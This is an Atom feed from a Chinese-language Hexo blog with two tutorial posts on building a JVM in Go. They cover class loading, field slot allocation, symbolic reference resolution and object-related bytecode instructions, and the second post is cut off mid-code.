<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小叹</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2022-01-23T03:13:10.585Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>手撸一个JVM虚拟机--类和对象（二）</title>
    <link href="http://yoursite.com/2022/01/23/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/2022/01/23/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-01-23T03:12:01.000Z</published>
    <updated>2022-01-23T03:13:10.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、类加载器"><a href="#一、类加载器" class="headerlink" title="一、类加载器"></a>一、类加载器</h1><p>Java虚拟机将类文件中描述类的数据从class文件加载到内存中，并对文件进行校验、转换、解析和初始化，最终形成可以被虚拟机直接使用的java类型，这个过程被称为虚拟机的类加载机制。与其他语言不同Java语言类型的加载、连接和初始化过程都是在程序的运行期间完成的。</p><h2 id="一个类型从加载到内存开始，到卸载出内存，它的生命周期需要经过：加载、验证、准备、解析、初始化、使用和卸载七个阶段。"><a href="#一个类型从加载到内存开始，到卸载出内存，它的生命周期需要经过：加载、验证、准备、解析、初始化、使用和卸载七个阶段。" class="headerlink" title="一个类型从加载到内存开始，到卸载出内存，它的生命周期需要经过：加载、验证、准备、解析、初始化、使用和卸载七个阶段。"></a>一个类型从加载到内存开始，到卸载出内存，它的生命周期需要经过：加载、验证、准备、解析、初始化、使用和卸载七个阶段。</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gymewg9cy9j30xq0e2wfk.jpg" alt="">1.1 ClassLoader</p><p>下面来写一个简化的类加载器，在rtda/heap目录下创建class_loader.go文件</p><pre><code class="go">type ClassLoader struct &#123;   cp        *classpath.Classpath   classMap   map[string]*Class  &#125;  func NewClassLoader(cp *classpath.Classpath) *ClassLoader &#123;   return &amp;ClassLoader&#123;        cp:          cp,        classMap: make(map[string]*Class),     &#125;  &#125;</code></pre><p>其中cp字段储存类路径，而classMap用来存储已经加载的类数据。方法区一直是一个抽象的概念，现在可以把classMap字段当作方法区的具体实现。而如何把方法区的数据加载到classMap中是在LoadClass()中实现的：</p><pre><code class="go">func (self *ClassLoader) LoadClass(name string) *Class &#123;    if class, ok := self.classMap[name]; ok &#123;        return class//类已经加载    &#125;    return self.loadNonArrayClass(name)&#125;</code></pre><p>其流程是先判断类是否已被加载，如果没有加载则调用loadNonArrayClass()方法加载类，其中暂不考虑数组类，loadNonArrayClass()方法如下：</p><pre><code class="go">func (self *ClassLoader) loadNonArrayClass(name string) *Class &#123;    data, entry := self.readClass(name)    class := self.defineClass(data)    link(class)    fmt.Printf(&quot;[Loaded %s from %s]\n&quot;, name, entry)    return class&#125;</code></pre><p>流程如前文说的，先将class文件加载进内存，再解析class文件数据，生成虚拟机能够使用的类数据，最后进行链接。</p><h3 id="1-1-readClass"><a href="#1-1-readClass" class="headerlink" title="1.1 readClass()"></a>1.1 readClass()</h3><p>其中readClass()其实是调用类classpath中的readClass()，这里是<a href="https://www.yuque.com/xiao-tan/gc6e3o/zewiyn#3394f1b9">链接</a></p><pre><code class="go">func (self *ClassLoader) readClass(name string) ([]byte, classpath.Entry) &#123;    data, entry, err := self.cp.ReadClass(name)    if err != nil &#123;        panic(&quot;java.lang.ClassNotFoundExecption: &quot; + name)    &#125;    return data, entry&#125;</code></pre><h3 id="1-2-defineClass"><a href="#1-2-defineClass" class="headerlink" title="1.2 defineClass()"></a>1.2 defineClass()</h3><pre><code class="go">func (self *ClassLoader) defineClass(data []byte) *Class &#123;    class := parseClass(data)    class.loader = self    resolveSuperClass(class)    resolveInterfaces(class)    self.classMap[class.name] = class    return class&#125;func parseClass(data []byte) *Class &#123;    cf, err := classfile.Parse(data)    if err != nil &#123;        panic(&quot;java.lang.ClassFormatError&quot;)    &#125;    return newClass(cf)&#125;</code></pre><p>defineClass()中首先调用parseClass()将文件数据转换成Class结构体</p><pre><code class="go">func resolveSuperClass(class *Class) &#123;    if class.name != &quot;java/lang/Object&quot; &#123;        class.superClass = class.loader.LoadClass(class.superClassName)    &#125;&#125;func resolveInterfaces(class *Class) &#123;    interfaceCount := len(class.interfaceNames)    if interfaceCount &gt; 0 &#123;        class.interfaces = make([]*Class, interfaceCount)        for i, interfaceName := range class.interfaceNames&#123;            class.interfaces[i] = class.loader.LoadClass(interfaceName)        &#125;    &#125;&#125;</code></pre><p>而除非是Object类，否则需要递归调用LoadClass()方法加载它的超类，于此类似的还有resolveInterfaces()，而link则分为验证和准备阶段，而验证的代码没写。。。</p><pre><code class="go">func link(class *Class) &#123;    verify(class)    prepare(class)&#125;func verify(class *Class) &#123;    // todo&#125;// jvms 5.4.2func prepare(class *Class) &#123;    calcInstanceFieldSlotIds(class)    calcStaticFieldSlotIds(class)    allocAndInitStaticVars(class)&#125;</code></pre><h2 id="二、类变量和实例变量"><a href="#二、类变量和实例变量" class="headerlink" title="二、类变量和实例变量"></a>二、类变量和实例变量</h2><p>在之前的heap包中的slot.go、local_var.go就可以用来表示类变量和实例变量，但是go语言的包不能互相依赖，所以只能复制代码，在rtda\heap目录下创建slots.go</p><pre><code class="go">type Slot struct &#123;    num int32    ref *Object&#125;type Slots []Slot</code></pre><p>其中的方法没给出都是一样的代码，都是Get、Set的方法，下面是rtda/heap/object.go文件</p><pre><code class="go">type Object struct &#123;    class *Class    fields Slots&#125;func newObject(class *Class) *Object &#123;    return &amp;Object&#123;        class: class,        fields: newSlots(class.instanceSlotCount),    &#125;&#125;func (self *Object) IsInstanceOf(class *Class)bool &#123;    return class.isAssignableFrom(self.class)&#125;</code></pre><p>后面需要解决的问题就是如何计算静态变量和实例变量，以及哪个字段对应Slot中的位置，在前文讲到的prepare()函数中，calcInstanceFieldSlotIds(class)计算实例字段的个数，同时给它们编号：</p><pre><code class="go">func calcInstanceFieldSlotIds(class *Class) &#123;    slotId := uint(0)    if class.superClass != nil &#123;        slotId = class.superClass.instanceSlotCount    &#125;    for _, field := range class.fields &#123;        if !field.IsStatic() &#123;            field.slotId = slotId            slotId++            if field.isLongOrDouble() &#123;                slotId++            &#125;        &#125;    &#125;    class.instanceSlotCount = slotId&#125;</code></pre><p>其中递归的数超类的实例变量，而long和double需要占两个位置。</p><p>calcStaticFieldSlotIds()函数计算静态字段的个数，同时进行编号</p><pre><code class="go">func calcStaticFieldSlotIds(class *Class) &#123;    slotId := uint(0)    for _, field := range class.fields &#123;        if field.IsStatic() &#123;            field.slotId = slotId            slotId++            if field.isLongOrDouble() &#123;                slotId++            &#125;        &#125;    &#125;    class.staticSlotCount = slotId&#125;</code></pre><p>allocAndInitStaticVars()给类变量分配空间，赋初值。因为go语言会保证新创建的slot结构体有默认值所以不需要什么操作。</p><pre><code class="go">func allocAndInitStaticVars(class *Class) &#123;    class.staticVars = newSlots(class.staticSlotCount)    for _, field := range class.fields &#123;        if field.IsStatic() &amp;&amp; field.IsFinal() &#123;            initStaticFinalVar(class, field)        &#125;    &#125;&#125;func initStaticFinalVar(class *Class, field *Field) &#123;    vars := class.staticVars    cp := class.constantPool    cpIndex := field.ConstValueIndex()    slotId := field.SlotId()    if cpIndex &gt; 0 &#123;        switch field.Descriptor() &#123;        case &quot;Z&quot;, &quot;B&quot;, &quot;C&quot;, &quot;S&quot;, &quot;I&quot;:            val := cp.GetConstant(cpIndex).(int32)            vars.SetInt(slotId, val)        case &quot;J&quot;:            val := cp.GetConstant(cpIndex).(int64)            vars.SetLong(slotId, val)        case &quot;F&quot;:            val := cp.GetConstant(cpIndex).(float32)            vars.SetFloat(slotId, val)        case &quot;D&quot;:            val := cp.GetConstant(cpIndex).(float64)            vars.SetDouble(slotId, val)        case &quot;Ljava/lang/String;&quot;:            panic(&quot;todo&quot;)        &#125;    &#125;&#125;</code></pre><h2 id="三、类和字段符号引用解析"><a href="#三、类和字段符号引用解析" class="headerlink" title="三、类和字段符号引用解析"></a>三、类和字段符号引用解析</h2><h3 id="3-1-类符号引用解析"><a href="#3-1-类符号引用解析" class="headerlink" title="3.1 类符号引用解析"></a>3.1 类符号引用解析</h3><p>在前一篇文章中曾定义类符号引用的结构体SymRef，现在在其中定义ResolvedClass()<a href="https://www.yuque.com/xiao-tan/gc6e3o/tveypp#a64ffa30">链接</a></p><pre><code class="go">func (self *SymRef) ResolvedClass() *Class &#123;    if self.class == nil &#123;        self.resolveClassRef()    &#125;    return self.class&#125;func (self *SymRef) resolveClassRef() &#123;    d := self.cp.class    c := d.loader.LoadClass(self.className)    if !c.isAccessibleTo(d) &#123;        panic(&quot;java.lang.IllegalAccessError&quot;)    &#125;    self.class =c&#125;</code></pre><p>如果符号以及解析则返回指针，如果没有则进入resolveClassRef()函数，而在这个函数中如果类D通过符号引用N引用类C的话，要解析N，先用D的类加载器加载C，然后检查D是否有权限访问C，如果没有，则抛出异常。</p><pre><code>func (self *Class) isAccessibleTo(other *Class) bool &#123;    return self.IsPublic() || self.getPackageName() == other.getPackageName()</code></pre><p>从上面代码可以看出如果想要访问，则需要满足两个条件之一，第一个是C为public，第二个是C和D在同一个包中。</p><h3 id="3-2-字段符号引用解析"><a href="#3-2-字段符号引用解析" class="headerlink" title="3.2 字段符号引用解析"></a>3.2 字段符号引用解析</h3><p>在cp_fieldref.go中定义ResolvedField()</p><pre><code class="go">func (self *FieldRef) ResolveField() *Field &#123;    if self.field == nil &#123;        self.resolveFieldRef()    &#125;    return self.field&#125;func (self *FieldRef) resolveFieldRef() &#123;    d := self.cp.class    c := self.ResolvedClass()    field := lookupField(c, self.name, self.descriptor)    if field == nil &#123;        panic(&quot;java.lang.NoSuchFieldError&quot;)    &#125;    if !field.isAccessibleTo(d) &#123;        panic(&quot;java.lang.IllegalAccessError&quot;)    &#125;    self.field = field&#125;func lookupField(c *Class, name string, descriptor string) *Field &#123;    for _, field := range c.fields &#123;        if field.name == name &amp;&amp; field.descriptor == descriptor&#123;            return field        &#125;    &#125;    for _, iface := range c.interfaces    &#123;        if field := lookupField(iface, name, descriptor); field != nil &#123;            return field        &#125;    &#125;    if c.superClass != nil&#123;        return lookupField(c.superClass, name, descriptor)    &#125;    return nil&#125;</code></pre><p>如果类D想通过字段引用访问类C的字段，首先要解析符号引用得到类C，然后根据字段名和描述符查找字段。如果字段查找失败则抛出异常，如果没有权限也会抛出异常。</p><h2 id="四、类和对象的指令"><a href="#四、类和对象的指令" class="headerlink" title="四、类和对象的指令"></a>四、类和对象的指令</h2><p>指令如下：new（创建类实例）;putstatic和getstatic指令用于存取静态变量；putfield和getfield用于存取实例变量；instanceof和checkcast指令用于判断对象是否属于某种类型；ldc系列指令把运行常量池中的常量推到操作数栈顶。在instructions目录下创建reference子目录来存放引用类指令。</p><h3 id="4-1-new指令"><a href="#4-1-new指令" class="headerlink" title="4.1 new指令"></a>4.1 new指令</h3><pre><code class="go">type NEW struct &#123;    base.Index16Instruction&#125;func (self *NEW) Execute(frame *rtda.Frame)  &#123;    cp := frame.Method().Class().ConstantPool()    classRef := cp.GetConstant(self.Index).(*heap.ClassRef)    class := classRef.ResolvedClass()    if class.IsInterface() || class.IsAbstract() &#123;        panic(&quot;java.lang.InstantiationError&quot;)    &#125;    ref := class.NewObject()    frame.OperandStack().PushRef(ref)&#125;</code></pre><p>new指令的操作数是一个uint16索引，来自字节码可以从当前常量池中找一个类符号引用。因为接口和抽象类都不能实例化所以如果解析后都类是接口或者抽象类要抛出异常。</p><h3 id="4-2-putstatic、getstatic指令"><a href="#4-2-putstatic、getstatic指令" class="headerlink" title="4.2 putstatic、getstatic指令"></a>4.2 putstatic、getstatic指令</h3><pre><code class="go">type PUT_STATIC struct &#123;    base.Index16Instruction&#125;func (self *PUT_STATIC) Execute(frame *rtda.Frame)  &#123;    currentMethod := frame.Method()    currentClass := currentMethod.Class()    cp := currentClass.ConstantPool()    fieldRef := cp.GetConstant(self.Index).(*heap.FieldRef)    field := fieldRef.ResolveField()    class := field.Class()    if !field.IsStatic() &#123;        panic(&quot;java.lang.IncompatibleClassChangeError&quot;)    &#125;    if field.IsFinal() &#123;        if currentClass != class || currentMethod.Name() != &quot;&lt;clinit&gt;&quot; &#123;            panic(&quot;java.lang,IllegalAccessError&quot;)        &#125;    &#125;    descriptor := field.Descriptor()    slotID := field.SlotId()    slots := class.StaticVars()    stack := frame.OperandStack()    switch descriptor[0] &#123;    case &#39;Z&#39;, &#39;B&#39;, &#39;C&#39;, &#39;S&#39;, &#39;I&#39;: slots.SetInt(slotID,        stack.PopInt())    case &#39;F&#39;: slots.SetFloat(slotID, stack.PopFloat())    case &#39;J&#39;: slots.SetLong(slotID, stack.PopLong())    case &#39;D&#39;: slots.SetDouble(slotID, stack.PopDouble())    case &#39;L&#39;, &#39;[&#39;: slots.SetRef(slotID, stack.PopRef())    &#125;&#125;</code></pre><p>putstatic指令给类的某个静态变量赋值，它需要两个操作数。第一个是uint16索引，来自字节码。第二个操作数就是要赋值给静态变量的值，从操作数栈中弹出。执行流程：先拿到当前方法，当前类和当前常量池，然后解析字段符号引用。如果声明字段的类未被初始化，则需要先初始化该类.</p><pre><code class="go">type GET_STATIC struct &#123;    base.Index16Instruction&#125;func (self *GET_STATIC) Execute(frame *rtda.Frame) &#123;    cp := frame.Method().Class().ConstantPool()    fieldRef := cp.GetConstant(self.Index).(*heap.FieldRef)    field := fieldRef.ResolvedField()    class := field.Class()    // todo: init class    if !field.IsStatic() &#123;        panic(&quot;java.lang.IncompatibleClassChangeError&quot;)    &#125;    descriptor := field.Descriptor()    slotId := field.SlotId()    slots := class.StaticVars()    stack := frame.OperandStack()    switch descriptor[0] &#123;    case &#39;Z&#39;, &#39;B&#39;, &#39;C&#39;, &#39;S&#39;, &#39;I&#39;:        stack.PushInt(slots.GetInt(slotId))    case &#39;F&#39;:        stack.PushFloat(slots.GetFloat(slotId))    case &#39;J&#39;:        stack.PushLong(slots.GetLong(slotId))    case &#39;D&#39;:        stack.PushDouble(slots.GetDouble(slotId))    case &#39;L&#39;, &#39;[&#39;:        stack.PushRef(slots.GetRef(slotId))    default:        // todo    &#125;</code></pre><p>getstatic类似。</p><h3 id="4-3-putfield和getfield"><a href="#4-3-putfield和getfield" class="headerlink" title="4.3 putfield和getfield"></a>4.3 putfield和getfield</h3><p>putfield指令给实例变量赋值，它需要三个操作数。前两个操作数是常量池索引和变量用法和putstatic一样，第三个操作数则是对象引用。</p><pre><code class="go">type PUT_FIELD struct&#123; base.Index16Instruction &#125;func (self *PUT_FIELD) Execute(frame *rtda.Frame) &#123;    currentMethod := frame.Method()    currentClass := currentMethod.Class()    cp := currentClass.ConstantPool()    fieldRef := cp.GetConstant(self.Index).(*heap.FieldRef)    field := fieldRef.ResolvedField()    if field.IsStatic() &#123;        panic(&quot;java.lang.IncompatibleClassChangeError&quot;)    &#125;    if field.IsFinal() &#123;        if currentClass != field.Class() || currentMethod.Name() != &quot;&lt;init&gt;&quot; &#123;            panic(&quot;java.lang.IllegalAccessError&quot;)        &#125;    &#125;    descriptor := field.Descriptor()    slotId := field.SlotId()    stack := frame.OperandStack()    switch descriptor[0] &#123;    case &#39;Z&#39;, &#39;B&#39;, &#39;C&#39;, &#39;S&#39;, &#39;I&#39;:        val := stack.PopInt()        ref := stack.PopRef()        if ref == nil &#123;            panic(&quot;java.lang.NullPointerException&quot;)        &#125;        ref.Fields().SetInt(slotId, val)    case &#39;F&#39;:        val := stack.PopFloat()        ref := stack.PopRef()        if ref == nil &#123;            panic(&quot;java.lang.NullPointerException&quot;)        &#125;        ref.Fields().SetFloat(slotId, val)    case &#39;J&#39;:        val := stack.PopLong()        ref := stack.PopRef()        if ref == nil &#123;            panic(&quot;java.lang.NullPointerException&quot;)        &#125;        ref.Fields().SetLong(slotId, val)    case &#39;D&#39;:        val := stack.PopDouble()        ref := stack.PopRef()        if ref == nil &#123;            panic(&quot;java.lang.NullPointerException&quot;)        &#125;        ref.Fields().SetDouble(slotId, val)    case &#39;L&#39;, &#39;[&#39;:        val := stack.PopRef()        ref := stack.PopRef()        if ref == nil &#123;            panic(&quot;java.lang.NullPointerException&quot;)        &#125;        ref.Fields().SetRef(slotId, val)    default:        // todo    &#125;&#125;</code></pre><p>和putstatic差不多，但是解析后的字段必须是实例字段，否则抛出IncompatibleClassChangeError。如果是final字段，则只能构造函数中初始化，否则抛出IllegalAccessError。</p><pre><code class="go">type GET_FIELD struct&#123; base.Index16Instruction &#125;func (self *GET_FIELD) Execute(frame *rtda.Frame) &#123;    cp := frame.Method().Class().ConstantPool()    fieldRef := cp.GetConstant(self.Index).(*heap.FieldRef)    field := fieldRef.ResolvedField()    if field.IsStatic() &#123;        panic(&quot;java.lang.IncompatibleClassChangeError&quot;)    &#125;    stack := frame.OperandStack()    ref := stack.PopRef()    if ref == nil &#123;        panic(&quot;java.lang.NullPointerException&quot;)    &#125;    descriptor := field.Descriptor()    slotId := field.SlotId()    slots := ref.Fields()    switch descriptor[0] &#123;    case &#39;Z&#39;, &#39;B&#39;, &#39;C&#39;, &#39;S&#39;, &#39;I&#39;:        stack.PushInt(slots.GetInt(slotId))    case &#39;F&#39;:        stack.PushFloat(slots.GetFloat(slotId))    case &#39;J&#39;:        stack.PushLong(slots.GetLong(slotId))    case &#39;D&#39;:        stack.PushDouble(slots.GetDouble(slotId))    case &#39;L&#39;, &#39;[&#39;:        stack.PushRef(slots.GetRef(slotId))    default:        // todo    &#125;&#125;</code></pre><h3 id="4-4-instanceof和checkcast指令"><a href="#4-4-instanceof和checkcast指令" class="headerlink" title="4.4 instanceof和checkcast指令"></a>4.4 instanceof和checkcast指令</h3><p>instanceof指令判断对象是否是某个类的实例或者对象的类是否实现类某个接口，并把结果推入操作数栈。</p><pre><code class="go">type INSTANCE_OF struct &#123;    base.Index16Instruction&#125;func (self *INSTANCE_OF) Execute(frame *rtda.Frame) &#123;    stack := frame.OperandStack()    ref := stack.PopRef()    if ref == nil &#123;        stack.PushInt(0)        return    &#125;    cp := frame.Method().Class().ConstantPool()    classRef := cp.GetConstant(self.Index).(*heap.ClassRef)    class := classRef.ResolvedClass()    if ref.IsInstanceOf(class) &#123;        stack.PushInt(1)    &#125;else &#123;        stack.PushInt(0)    &#125;&#125;</code></pre><p>先弹出对象引用，如果是null，则把0推入操作数栈。用Java代码解释就是，如果引用obj是null，不管Class是哪种类型，都判断为false，如果对象引用不是null则解析符号引用，判断对象是否是类的实例，再将结果压栈。</p><p>checkcast指令和它很像，区别是instanceof指令会改变操作数栈，而checkcast不改变操作数栈。</p><pre><code class="go">type CHECK_CAST struct &#123;    base.Index16Instruction&#125;func (self *CHECK_CAST) Execute(frame *rtda.Frame) &#123;    stack := frame.OperandStack()    ref := stack.PopRef()    stack.PushRef(ref)    if ref == nil &#123;        return    &#125;    cp := frame.Method().Class().ConstantPool()    classRef := cp.GetConstant(self.Index).(*heap.ClassRef)    class := classRef.ResolvedClass()    if !ref.IsInstanceOf(class) &#123;        panic(&quot;java.lang.ClassCastException&quot;)    &#125;&#125;</code></pre><h3 id="4-5-ldc指令"><a href="#4-5-ldc指令" class="headerlink" title="4.5 ldc指令"></a>4.5 ldc指令</h3><p>ldc指令从运行时常量池中加载常量值，并把它推入操作数栈。ldc系列指令属于常量类指令，共三条。其中ldc和ldc_w用于加载int、float和字符串常量，java.lang.Class实例或者MethodType和MethodHandle实例。ldc2_w指令用于加载long和double常量。ldc和ldc_w指令的区别仅在于操作数的宽度。中instructions\constants下创建ldc.go</p><pre><code class="go">type LDC struct &#123;    base.Index8Instruction&#125;type LDC_W struct &#123;    base.Index16Instruction&#125;type LDC2_W struct &#123;    base.Index16Instruction&#125;func (self *LDC) Execute(frame *rtda.Frame)  &#123;    _ldc(frame, self.Index)&#125;func (self *LDC_W) Execute(frame *rtda.Frame)  &#123;    _ldc(frame, self.Index)&#125;func _ldc(frame *rtda.Frame, index uint) &#123;    stack := frame.OperandStack()    cp := frame.Method().Class().ConstantPool()    c := cp.GetConstant(index)    switch c.(type) &#123;    case int32:        stack.PushInt(c.(int32))    case float32:        stack.PushFloat(c.(float32))    //case string:    //case *heap.ClassRef:    default:        panic(&quot;todo: ldc! &quot;)    &#125;&#125;func (self *LDC2_W) Execute(frame *rtda.Frame) &#123;    stack := frame.OperandStack()    cp := frame.Method().Class().ConstantPool()    c := cp.GetConstant(self.Index)    switch c.(type) &#123;    case int64:        stack.PushLong(c.(int64))    case float64:        stack.PushDouble(c.(float64))    default:        panic(&quot;java.lang.ClassFormatError&quot;)    &#125;&#125;</code></pre><h2 id="五、测试代码"><a href="#五、测试代码" class="headerlink" title="五、测试代码"></a>五、测试代码</h2><pre><code class="go">func startJVM(cmd *CMD) &#123;    cp := classpath.Parse(cmd.XjreOption, cmd.cpOption)    classLoader := heap.NewClassLoader(cp)    className := strings.Replace(cmd.class, &quot;.&quot;, &quot;/&quot;, -1)    mainClass := classLoader.LoadClass(className)    mainMethod := mainClass.GetMainMethod()    if mainMethod != nil &#123;        interpret(mainMethod)    &#125; else &#123;        fmt.Printf(&quot;Main method not found in class %s\n&quot;, cmd.class)    &#125;&#125;func (self *Class) GetMainMethod() *Method &#123;    return self.getStaticMethod(&quot;main&quot;, &quot;([Ljava/lang/String;)V&quot;)&#125;</code></pre><p>下面编辑interpreter.go</p><pre><code class="go">func interpret(method *heap.Method) &#123;    thread := rtda.NewThread()    frame := thread.NewFrame(method)    thread.PushFrame(frame)    defer catchErr(frame)    loop(thread, method.Code())&#125;func catchErr(frame *rtda.Frame) &#123;    if r := recover(); r != nil &#123;        //fmt.Printf(&quot;LocalVars:%v\n&quot;, frame.LocalVars())        //fmt.Printf(&quot;OperandStack:%v\n&quot;, frame.OperandStack())        //panic(r)    &#125;&#125;func loop(thread *rtda.Thread, bytecode []byte) &#123;    frame := thread.PopFrame()    reader := &amp;base.BytecodeReader&#123;&#125;    for &#123;        pc := frame.NextPC()        thread.SetPC(pc)        // decode        reader.Reset(bytecode, pc)        opcode := reader.ReadUint8()        inst := instructions.NewInstruction(opcode)        inst.FetchOperands(reader)        frame.SetNextPC(reader.PC())        // execute        fmt.Printf(&quot;pc:%2d inst:%T %v\n&quot;, pc, inst, inst)        inst.Execute(frame)    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gynf6jcsn8j30vo0o2whb.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--类和对象（二）
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>手撸一个JVM虚拟机--类和对象（一）</title>
    <link href="http://yoursite.com/2022/01/21/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2022/01/21/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-01-21T09:49:01.000Z</published>
    <updated>2022-01-21T09:49:28.055Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、方法区"><a href="#一、方法区" class="headerlink" title="一、方法区"></a>一、方法区</h1><p>方法区（Method area）和Java堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类型信息、常量、静态变量、即时编译器编译后的代码缓存等信息。</p><h2 id="1-1-方法区的关键信息"><a href="#1-1-方法区的关键信息" class="headerlink" title="1.1 方法区的关键信息"></a>1.1 方法区的关键信息</h2><h3 id="1-1-1-类信息：修饰符-public-final"><a href="#1-1-1-类信息：修饰符-public-final" class="headerlink" title="1.1.1 类信息：修饰符(public final)"></a>1.1.1 <strong>类信息：</strong>修饰符(public final)</h3><pre><code>                    是类还是接口(class,interface)                    类的全限定名(Test/ClassStruct.class)                    直接父类的全限定名(java/lang/Object.class)                    直接父接口的权限定名数组(java/io/Serializable)</code></pre><p>也就是 public final class ClassStruct extends Object implements Serializable这段描述的信息提取</p><h3 id="1-1-2-字段信息：修饰符-pirvate"><a href="#1-1-2-字段信息：修饰符-pirvate" class="headerlink" title="1.1.2 字段信息：修饰符(pirvate)"></a>1.1.2 <strong>字段信息：</strong>修饰符(pirvate)</h3><pre><code>                        字段类型(java/lang/String.class)                        字段名(name)</code></pre><p>也就是类似private String name;这段描述信息的提取</p><h3 id="1-1-3-方法信息-修饰符-public-static-final"><a href="#1-1-3-方法信息-修饰符-public-static-final" class="headerlink" title="1.1.3 方法信息:修饰符(public static final)"></a>1.1.3 <strong>方法信息:</strong>修饰符(public static final)</h3><pre><code>                      方法返回值(java/lang/String.class)                      方法名(getStatic_str)                      参数需要用到的局部变量的大小还有操作数栈大小(操作数栈我们后面会讲)                      方法体的字节码(就是花括号里的内容)                      异常表(throws Exception)</code></pre><p>也就是对方法public static final String getStatic_str ()throws Exception的字节码的提取</p><h3 id="1-1-4-常量池"><a href="#1-1-4-常量池" class="headerlink" title="1.1.4 常量池:"></a>1.1.4 <strong>常量池:</strong></h3><pre><code>                直接常量：                               a.CONSTANT_INGETER_INFO整型直接常量池public final int CONST_INT=0;                               b.CONSTANT_String_info字符串直接常量池public final String CONST_STR=&quot;CONST_STR&quot;;                               c.CONSTANT_DOUBLE_INFO浮点型直接常量池                               等等各种基本数据类型基础常量池(待会我们会反编译一个类，来查看它的常量池等。)                 方法名、方法描述符、类名、字段名，字段描述符的符号引用</code></pre><h3 id="1-1-5-类变量-静态变量）："><a href="#1-1-5-类变量-静态变量）：" class="headerlink" title="1.1.5 类变量(静态变量）："></a>1.1.5 <strong>类变量(静态变量）：</strong></h3><pre><code>              就是静态字段( public static String static_str=&quot;static_str&quot;;)              虚拟机在使用某个类之前，必须在方法区为这些类变量分配空间。</code></pre><h3 id="1-1-6-一个到classLoader的引用"><a href="#1-1-6-一个到classLoader的引用" class="headerlink" title="1.1.6 一个到classLoader的引用"></a>1.1.6 <strong>一个到classLoader的引用</strong></h3><p>通过this.getClass().getClassLoader()来取得</p><h3 id="1-1-7-一个到class对象的引用"><a href="#1-1-7-一个到class对象的引用" class="headerlink" title="1.1.7 一个到class对象的引用"></a>1.1.7 <strong>一个到class对象的引用</strong></h3><p>这个对象存储了所有这个字节码内存块的相关信息。所有你能够看到的区域，比如：类信息，你可以通过this.getClass().getName()取得所有的方法信息，可以通过this.getClass().getDeclaredMethods()，字段信息可以通过this.getClass().getDeclaredFields()，等等，所有在字节码中你想得到的，调用的，通过class这个引用基本都能够帮你完成。因为他就是字节码在内存块在堆中的一个对象</p><h3 id="1-1-8-方法表，"><a href="#1-1-8-方法表，" class="headerlink" title="1.1.8 方法表，"></a>1.1.8 <strong>方法表，</strong></h3><p>如果学习c++的人应该都知道c++的对象内存模型有一个叫虚表的东西，java本来的名字就叫c++- -，它的方法表其实说白了就是c++的虚表，它的内容就是这个类的所有实例可能被调用的所有实例方法的直接引用。也是为了动态绑定的快速定位而做的一个类似缓存的查找表，它以数组的形式存在于内存中。不过这个表不是必须存在的，取决于虚拟机的设计者，以及运行虚拟机的机器是否有足够的内存。</p><h2 id="1-2-代码实现"><a href="#1-2-代码实现" class="headerlink" title="1.2 代码实现"></a>1.2 代码实现</h2><h3 id="1-2-1-类信息"><a href="#1-2-1-类信息" class="headerlink" title="1.2.1 类信息"></a>1.2.1 类信息</h3><p>使用结构体来表示方法区中存放的类rtda\heap目录下创建class.go文件,accessFlags是类访问标志，总共16比特。字段和方法也有类访问标志，但各个标志位的含义可能会存在不同。name、superClassName、interfaceNames字段分别存放类名、超类名和接口名。</p><pre><code class="go">type Class struct &#123;   accessFlags       uint16   name         string   superClassName  string   interfaceNames     []string   constantPool   *ConstantPool   fields       []*Field   methods       []*Method   loader       *ClassLoader   superClass    *Class   interfaces    []*Class   instanceSlotCount  uint   staticSlotCount       uint   staticVars       Slots  &#125;</code></pre><p>在heap\access_flag.go文件中存放标志位，代码如下：</p><pre><code class="go">const(   ACC_PUBLIC = 0x0001   ACC_PRIVATE = 0x0002   ACC_PROTECTED = 0x0004   ACC_STATIC = 0x0008   ACC_FINAL = 0x0010   ACC_SUPER = 0x0020   ACC_SYNCHRONIZED = 0x0020   ACC_VOLATILE = 0x0040   ACC_BRIDGE = 0x0040   ACC_TRANSIENT = 0x0080   ACC_VARARGS = 0x0080   ACC_NATIVE = 0x0100   ACC_INTERFACE = 0x0200   ACC_ABSTRACT = 0x0400   ACC_STRICT = 0x0800   ACC_SYNTHETIC = 0x1000   ACC_ANNOTATION = 0x2000   ACC_ENUM = 0x4000</code></pre><p>在class.go中定义了newClass()函数，用来把ClassFile结构体转换成Class结构体：</p><pre><code class="go">func newClass(cf *classfile.ClassFile) *Class&#123;   class := &amp;Class&#123;&#125;   class.accessFlags = cf.AccessFlags()   class.name = cf.ClassName()   class.superClassName = cf.SuperClassName()   class.interfaceNames= cf.InterfaceNames()   class.constantPool = newConstantPool(class, 